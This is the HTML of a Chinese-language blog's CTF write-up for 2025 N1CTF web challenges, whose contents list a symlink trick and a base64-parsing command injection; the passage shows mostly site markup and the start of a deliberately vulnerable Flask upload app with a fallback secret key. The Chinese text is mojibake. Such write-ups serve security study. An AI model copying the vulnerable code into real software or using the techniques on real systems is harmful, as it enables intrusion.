æ‰“è½¯é“¾æ¥ï¼Œåœ¨è™šæ‹Ÿæœºè¿›è¡Œä¸‹é¢å‘½ä»¤\n">
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_b0f9889609c95e4e.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ’—</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">ç½—é“ é¸¿</a></h1>
            <h2 class="site-description"></h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://mpbeta.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.10336'
                        target="_blank"
                        title="csdn"
                        rel="me"
                    >
                        
                        
                            <?xml version="1.0" ?><!DOCTYPE svg  PUBLIC '-//W3C//DTD SVG 1.1//EN'  'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg enable-background="new 0 0 156.457 156.457" height="156.457" id="Layer_1" overflow="visible" version="1.1" viewBox="0 0 156.457 156.457" width="156.457" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="icon"><circle cx="78.229" cy="78.229" fill="#EF7A2B" r="78.229"/><path d="M64.616,117.315c-9.653-0.584-16.453-4.751-19.793-12.154c-1.493-3.292-2.118-6.459-2.153-10.876   c-0.021-2.306,0.403-27.915,0.549-33.193c0.146-5.563,1.188-9.532,3.424-13.019c3.174-4.969,7.667-7.785,14.265-8.879   c2.542-0.424,24.8-0.875,26.96-0.521c5.001,0.827,8.932,2.858,12.224,6.306c2.694,2.823,4.444,6.236,5.257,10.271   c0.563,2.816,0.625,9.584,0.104,12.345c-0.194,0.983-0.223,1.386-0.104,1.386c0.091,0,0.868,0.066,1.716,0.149   c3.403,0.319,5.966,1.132,7.91,2.503c3.396,2.389,5,5.661,5.368,10.928c0.223,3.098,0.181,11.348-0.055,13.293   c-0.792,6.25-2.952,10.979-6.765,14.778c-3.577,3.57-7.737,5.57-13.522,6.501c-1.306,0.208-3.326,0.236-17.467,0.264   C73.735,117.412,65.672,117.371,64.616,117.315L64.616,117.315L64.616,117.315z M99.202,99.036   c1.285-0.334,2.153-0.819,3.091-1.765c2.188-2.194,2.632-5.319,1.16-8.209c-0.417-0.813-1.64-2.027-2.584-2.556   c-1.659-0.931-0.902-0.889-19.335-0.889c-14.862,0-16.786,0.021-17.612,0.223c-3.07,0.757-5.139,3.417-5.139,6.598   c0,1.938,0.66,3.535,2.021,4.868c0.931,0.91,1.632,1.326,2.896,1.688c0.785,0.229,2.097,0.25,17.745,0.264   C96.376,99.258,98.438,99.237,99.202,99.036L99.202,99.036z M85.841,67.988c0.444-0.167,1.139-0.552,1.541-0.854   c4.438-3.333,3.334-10.125-1.958-12.008c-0.569-0.205-1.515-0.267-5.376-0.368c-8.25-0.208-13.695-0.188-14.445,0.052   c-1.194,0.385-2.167,0.972-2.965,1.785c-3.57,3.615-2.167,9.55,2.667,11.275c0.729,0.264,1.34,0.302,6.424,0.417   C83.465,68.551,84.382,68.533,85.841,67.988L85.841,67.988L85.841,67.988z" fill="#FFFFFF"/></g></svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/CaiJimmy/hugo-theme-stack'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>å½’æ¡£</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>æœç´¢</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>å‹æƒ…é“¾æ¥</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#online_unzipper">online_unzipper</a>
      <ol>
        <li><a href="#è€ƒç‚¹è½¯é“¾æ¥">è€ƒç‚¹ï¼šè½¯é“¾æ¥</a></li>
        <li><a href="#è§£æ³•äºŒ">è§£æ³•äºŒ</a></li>
      </ol>
    </li>
    <li><a href="#ping">ping</a>
      <ol>
        <li><a href="#è€ƒç‚¹åˆ©ç”¨pythonä¸lunixè§£æbase64çš„å·®å¼‚æŒ‡å‘å‘½ä»¤">è€ƒç‚¹ï¼šåˆ©ç”¨pythonä¸Lunixè§£æbase64çš„å·®å¼‚æŒ‡å‘å‘½ä»¤</a></li>
      </ol>
    </li>
    <li><a href="#peek-a-fork">Peek a Fork</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/write.up/" style="background-color: #2a9d8f; color: #fff;">
                write.up
            </a>
        
            <a href="/categories/web/" style="background-color: #ff0000; color: #fff;">
                web
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/2025n1ctf/">2025N1CTF</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-09-13</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    é˜…è¯»æ—¶é•¿: 6 åˆ†é’Ÿ
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <hr>
<h2 id="online_unzipper">online_unzipper
</h2><h3 id="è€ƒç‚¹è½¯é“¾æ¥">è€ƒç‚¹ï¼šè½¯é“¾æ¥
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">send_file</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">send_from_directory</span><span class="p">,</span> <span class="n">abort</span><span class="p">,</span> <span class="n">Response</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># åˆ›å»ºFlaskåº”ç”¨å®ä¾‹ï¼Œ__name__ç”¨äºç¡®å®šåº”ç”¨æ ¹ç›®å½•ä»¥ä¾¿æŸ¥æ‰¾èµ„æº</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># è®¾ç½®åº”ç”¨çš„å¯†é’¥ï¼Œç”¨äºåŠ å¯†ä¼šè¯ï¼ˆsessionï¼‰ã€‚ä¼˜å…ˆä»ç¯å¢ƒå˜é‡FLASK_SECRET_KEYè·å–ï¼Œè‹¥æœªè®¾ç½®åˆ™ä½¿ç”¨é»˜è®¤å€¼&#39;test_key&#39;ï¼ˆç”Ÿäº§ç¯å¢ƒåº”é¿å…ä½¿ç”¨é»˜è®¤å€¼ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;FLASK_SECRET_KEY&#34;</span><span class="p">,</span> <span class="s2">&#34;test_key&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># å®šä¹‰æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•è·¯å¾„ï¼Œè¿™é‡Œè®¾ç½®ä¸ºå½“å‰å·¥ä½œç›®å½•ä¸‹çš„&#34;uploads&#34;æ–‡ä»¶å¤¹</span>
</span></span><span class="line"><span class="cl"><span class="n">UPLOAD_FOLDER</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="s2">&#34;uploads&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ç¡®ä¿ä¸Šä¼ ç›®å½•å­˜åœ¨ï¼Œexist_ok=Trueè¡¨ç¤ºå¦‚æœç›®å½•å·²å­˜åœ¨ä¹Ÿä¸ä¼šå¼•å‘é”™è¯¯</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">UPLOAD_FOLDER</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ç”¨ä¸€ä¸ªç®€å•çš„å­—å…¸æ¨¡æ‹Ÿç”¨æˆ·æ•°æ®åº“ï¼Œå­˜å‚¨ç”¨æˆ·åå’Œç”¨æˆ·ä¿¡æ¯ï¼ˆå¯†ç å’Œè§’è‰²ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">users</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    æ ¹è·¯å¾„è·¯ç”±ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">    æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç™»å½•ï¼ˆå³sessionä¸­æ˜¯å¦æœ‰usernameï¼‰ã€‚å¦‚æœæœªç™»å½•ï¼Œé‡å®šå‘åˆ°ç™»å½•é¡µé¢ï¼›å¦‚æœå·²ç™»å½•ï¼Œé‡å®šå‘åˆ°ä¸Šä¼ é¡µé¢ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;username&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;login&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;upload&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/register&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;password&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;ç”¨æˆ·åå·²å­˜åœ¨&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span> <span class="s2">&#34;role&#34;</span><span class="p">:</span> <span class="s2">&#34;user&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;login&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;register.html&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/login&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;password&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">users</span> <span class="ow">and</span> <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">][</span><span class="s2">&#34;password&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="n">password</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s2">&#34;role&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">][</span><span class="s2">&#34;role&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;upload&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;login.html&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/logout&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    ç”¨æˆ·ç™»å‡ºè·¯ç”±ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">    æ¸…é™¤sessionä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œé‡å®šå‘åˆ°ç™»å½•é¡µé¢ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;login&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/upload&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">      * ç®¡ç†å‘˜ï¼ˆadminï¼‰å¯ä»¥é€‰æ‹©ä½¿ç”¨è¡¨å•æä¾›çš„dirnameæˆ–è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªUUIDä½œä¸ºç›®å½•åã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">      * æ™®é€šç”¨æˆ·ï¼ˆuserï¼‰ä½¿ç”¨è‡ªåŠ¨ç”Ÿæˆçš„UUIDä½œä¸ºç›®å½•åã€‚
